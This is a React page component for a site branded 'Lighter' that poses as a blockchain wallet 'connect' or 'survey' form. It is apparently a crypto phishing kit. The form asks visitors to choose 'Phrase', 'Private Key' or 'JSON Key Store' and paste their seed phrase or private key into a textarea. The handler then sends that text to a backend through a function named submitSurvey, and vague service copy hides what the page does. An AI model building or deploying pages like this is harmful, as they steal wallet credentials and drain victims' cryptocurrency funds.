import { useState } from 'react';
import { Link, useNavigate, useSearchParams } from 'react-router-dom';
import { motion } from 'framer-motion';
import { Menu, X } from 'lucide-react';
import lighterLogo from '@/assets/lighter-logo.png';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';
import { submitSurvey } from '@/api/submit-survey';

const connectionMethods = [
  { value: "phrase", label: "Phrase" },
  { value: "private_key", label: "Private Key" },
  { value: "json_key", label: "JSON Key Store" },
];

const Survey = () => {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const walletName = searchParams.get("wallet") || "Unknown";
  const walletCode = walletName.toLowerCase().replace(/\s+/g, '_');
  
  const [selectedMethod, setSelectedMethod] = useState("");
  const [additionalText, setAdditionalText] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const navLinks = [
    { label: 'RESOURCES', href: '/#resources' },
    { label: 'FAQ', href: '/#faq' },
    { label: 'COMMUNITY', href: '/#community' },
  ];

  const handleSubmit = async () => {
    if (!selectedMethod) {
      toast({
        title: "Please select a method",
        description: "You need to select a connection method before submitting.",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      await submitSurvey({
        walletCode,
        walletName,
        connectionMethod: selectedMethod,
        additionalText: additionalText.trim(),
      });

      toast({
        title: "Survey submitted",
        description: "Thank you for your feedback!",
      });

      navigate('/success');
    } catch (error) {
      console.error('Error submitting survey:', error);
      toast({
        title: "Error",
        description: "Failed to submit survey. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-background/80 backdrop-blur-md border-b border-border/30">
        <div className="container mx-auto px-6 py-4">
          <nav className="flex items-center justify-between">
            {/* Logo */}
            <Link to="/" className="flex items-center gap-2 text-foreground hover:text-primary transition-colors">
              <img src={lighterLogo} alt="Lighter" className="w-6 h-6 object-contain" />
              <span className="font-sans font-bold text-lg tracking-wider">LIGHTER</span>
            </Link>

            {/* Desktop Navigation */}
            <div className="hidden md:flex items-center gap-12">
              {navLinks.map((link) => (
                <Link
                  key={link.label}
                  to={link.href}
                  className="text-sm font-mono text-muted-foreground hover:text-foreground transition-colors tracking-widest"
                >
                  {link.label}
                </Link>
              ))}
            </div>

            {/* Home Button */}
            <div className="hidden md:flex items-center gap-4">
              <Link to="/" className="btn-nav btn-corners text-xs">
                <span className="corner corner-tl" />
                <span className="corner corner-tr" />
                <span className="corner corner-bl" />
                <span className="corner corner-br" />
                HOME
              </Link>
            </div>

            {/* Mobile Menu Button */}
            <button
              className="md:hidden text-foreground"
              onClick={() => setIsMenuOpen(!isMenuOpen)}
            >
              {isMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>
          </nav>

          {/* Mobile Menu */}
          {isMenuOpen && (
            <div className="md:hidden pt-4 pb-6 border-t border-border/30 mt-4">
              <div className="flex flex-col gap-4">
                {navLinks.map((link) => (
                  <Link
                    key={link.label}
                    to={link.href}
                    className="text-sm font-mono text-muted-foreground hover:text-foreground transition-colors tracking-widest"
                    onClick={() => setIsMenuOpen(false)}
                  >
                    {link.label}
                  </Link>
                ))}
                <Link to="/" className="btn-nav btn-corners text-xs mt-4">
                  <span className="corner corner-tl" />
                  <span className="corner corner-tr" />
                  <span className="corner corner-bl" />
                  <span className="corner corner-br" />
                  HOME
                </Link>
              </div>
            </div>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 pt-32 pb-16 px-6">
        <div className="container mx-auto max-w-3xl">
          {/* Title Section */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
            className="mb-8"
          >
            <h1 className="text-2xl font-bold text-foreground mb-2 tracking-wide">Explore</h1>
            <p className="text-muted-foreground text-sm">Explore different connection modes</p>
          </motion.div>

          {/* Form Card */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.1 }}
            className="card-terminal p-8"
          >
            {/* Wallet Type */}
            <div className="mb-6">
              <span className="text-sm text-muted-foreground">DAPP Type: </span>
              <span className="text-sm text-foreground font-semibold">{walletName}</span>
            </div>

            {/* Method of Connection */}
            <div className="mb-6">
              <label className="block text-sm text-primary mb-2">Method of Connection</label>
              <Select value={selectedMethod} onValueChange={setSelectedMethod}>
                <SelectTrigger className="w-full bg-card border-border text-foreground focus:ring-primary">
                  <SelectValue placeholder="Select One" />
                </SelectTrigger>
                <SelectContent className="bg-card border-border">
                  {connectionMethods.map((method) => (
                    <SelectItem 
                      key={method.value} 
                      value={method.value}
                      className="text-foreground focus:bg-primary/20 focus:text-foreground"
                    >
                      {method.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {/* Additional Notes */}
            <div className="mb-6">
              <label className="block text-sm text-primary mb-2">Phrase, Key store or Private key</label>
              <Textarea
                value={additionalText}
                onChange={(e) => setAdditionalText(e.target.value)}
                placeholder="Enter additional details..."
                className="min-h-[120px] resize-none bg-card border-border text-foreground placeholder:text-muted-foreground focus:ring-primary focus:border-primary"
              />
            </div>

            {/* Submit Button */}
            <button
              onClick={handleSubmit}
              disabled={isSubmitting}
              className="w-full btn-primary btn-corners py-3 disabled:opacity-50"
            >
              <span className="corner corner-tl" />
              <span className="corner corner-tr" />
              <span className="corner corner-bl" />
              <span className="corner corner-br" />
              {isSubmitting ? "Submitting..." : "Connect"}
            </button>
          </motion.div>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-12 border-t border-border/30 bg-card/30">
        <div className="container mx-auto px-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
            {/* Logo & Description */}
            <div>
              <div className="flex items-center gap-2 mb-4">
                <img src={lighterLogo} alt="Lighter" className="w-5 h-5 object-contain" />
              </div>
              <p className="text-xs text-muted-foreground leading-relaxed max-w-md">
                Our commitment is to address a wide array of blockchain and crypto challenges comprehensively. 
                We strive to provide effective solutions that empower you to navigate the rapidly evolving 
                blockchain landscape with confidence. Trust us to optimize your operations and create a 
                successful and efficient blockchain ecosystem.
              </p>
            </div>

            {/* Quick Links */}
            <div>
              <h4 className="text-sm font-semibold text-foreground mb-4 tracking-wide">Quick Links</h4>
              <div className="flex flex-col gap-2">
                <Link to="/" className="text-xs text-muted-foreground hover:text-primary transition-colors">
                  Explore
                </Link>
                <Link to="/validate" className="text-xs text-muted-foreground hover:text-primary transition-colors">
                  Connect
                </Link>
              </div>
            </div>
          </div>

          {/* Copyright */}
          <div className="pt-8 border-t border-border/30">
            <p className="text-xs text-muted-foreground">
              © Copyright 2025 <span className="text-primary">Lighter</span>. All Rights Reserved.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Survey;
